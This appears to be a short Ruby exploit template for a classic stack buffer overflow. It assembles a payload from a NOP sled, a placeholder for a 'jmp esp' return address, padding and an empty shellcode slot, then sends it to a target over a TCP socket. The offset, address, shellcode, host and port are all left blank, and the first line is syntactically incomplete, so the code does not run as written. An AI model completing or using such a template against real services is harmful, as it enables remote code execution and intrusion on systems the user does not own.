
buff = "\x90"* #No-Op. Put the offset value here
buff+= "" #jmp esp
buff+=  "B"*10 #Additional no-ops for argument values 
buff+= "" #Shellcode


require 'socket'

TCPSocket.open("ipaddress",portvalue){ |s| s.puts buff }
